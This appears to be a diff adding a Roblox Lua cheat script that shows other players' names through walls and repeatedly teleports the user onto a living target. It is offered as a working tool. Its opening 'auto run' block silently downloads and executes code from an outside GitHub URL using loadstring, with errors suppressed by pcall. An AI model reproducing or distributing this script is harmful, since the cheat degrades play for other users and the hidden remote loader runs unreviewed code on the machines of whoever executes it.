@@ -1,0 +1,133 @@
+--// AUTO RUN LINK SCRIPT
+pcall(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/BreApple/RobloxUI/main/SRscriptNew"))()
+end)
+
+--// SERVICES
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+--// STATE
+local running = true
+local tpEnabled = false
+local currentTarget = nil
+
+--// GUI
+local gui = Instance.new("ScreenGui", game.CoreGui)
+gui.Name = "MiniTPGui"
+
+local frame = Instance.new("Frame", gui)
+frame.Size = UDim2.fromScale(0.25, 0.25)
+frame.Position = UDim2.fromScale(0.05, 0.4)
+frame.BackgroundColor3 = Color3.fromRGB(15,15,15)
+frame.Active = true
+frame.Draggable = true
+Instance.new("UICorner", frame).CornerRadius = UDim.new(0,12)
+
+local title = Instance.new("TextLabel", frame)
+title.Size = UDim2.fromScale(1,0.25)
+title.Text = "TP + ESP"
+title.TextColor3 = Color3.new(1,1,1)
+title.BackgroundTransparency = 1
+title.TextScaled = true
+
+local toggleTP = Instance.new("TextButton", frame)
+toggleTP.Position = UDim2.fromScale(0.1,0.35)
+toggleTP.Size = UDim2.fromScale(0.8,0.25)
+toggleTP.Text = "TP: OFF"
+toggleTP.BackgroundColor3 = Color3.fromRGB(45,45,45)
+toggleTP.TextColor3 = Color3.new(1,1,1)
+toggleTP.TextScaled = true
+Instance.new("UICorner", toggleTP)
+
+local closeBtn = Instance.new("TextButton", frame)
+closeBtn.Position = UDim2.fromScale(0.1,0.65)
+closeBtn.Size = UDim2.fromScale(0.8,0.25)
+closeBtn.Text = "TẮT SCRIPT"
+closeBtn.BackgroundColor3 = Color3.fromRGB(120,30,30)
+closeBtn.TextColor3 = Color3.new(1,1,1)
+closeBtn.TextScaled = true
+Instance.new("UICorner", closeBtn)
+
+--// ESP NAME
+local espFolder = Instance.new("Folder", gui)
+espFolder.Name = "ESP"
+
+local function createESP(plr)
+	if plr == LocalPlayer then return end
+	local function apply(char)
+		if not running then return end
+		local head = char:WaitForChild("Head",5)
+		if not head then return end
+
+		local bill = Instance.new("BillboardGui", espFolder)
+		bill.Adornee = head
+		bill.Size = UDim2.fromScale(4,1)
+		bill.AlwaysOnTop = true
+
+		local txt = Instance.new("TextLabel", bill)
+		txt.Size = UDim2.fromScale(1,1)
+		txt.BackgroundTransparency = 1
+		txt.Text = plr.Name
+		txt.TextColor3 = Color3.new(1,0,0)
+		txt.TextScaled = true
+	end
+
+	if plr.Character then apply(plr.Character) end
+	plr.CharacterAdded:Connect(apply)
+end
+
+for _,p in ipairs(Players:GetPlayers()) do
+	createESP(p)
+end
+Players.PlayerAdded:Connect(createESP)
+
+--// TARGET SYSTEM
+local function getNewTarget()
+	for _,p in ipairs(Players:GetPlayers()) do
+		if p ~= LocalPlayer and p.Character then
+			local hum = p.Character:FindFirstChild("Humanoid")
+			if hum and hum.Health > 0 then
+				return p
+			end
+		end
+	end
+	return nil
+end
+
+--// TP LOOP
+task.spawn(function()
+	while running do
+		if tpEnabled then
+			if not currentTarget
+			or not currentTarget.Character
+			or not currentTarget.Character:FindFirstChild("Humanoid")
+			or currentTarget.Character.Humanoid.Health <= 0 then
+				currentTarget = getNewTarget()
+			end
+
+			if currentTarget and currentTarget.Character then
+				local targetHRP = currentTarget.Character:FindFirstChild("HumanoidRootPart")
+				local myHRP = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+				if targetHRP and myHRP then
+					myHRP.CFrame = targetHRP.CFrame * CFrame.new(0,0,-3)
+				end
+			end
+		end
+		task.wait(1)
+	end
+end)
+
+--// BUTTONS
+toggleTP.MouseButton1Click:Connect(function()
+	tpEnabled = not tpEnabled
+	toggleTP.Text = tpEnabled and "TP: ON" or "TP: OFF"
+	if not tpEnabled then
+		currentTarget = nil
+	end
+end)
+
+closeBtn.MouseButton1Click:Connect(function()
+	running = false
+	gui:Destroy()
+end)
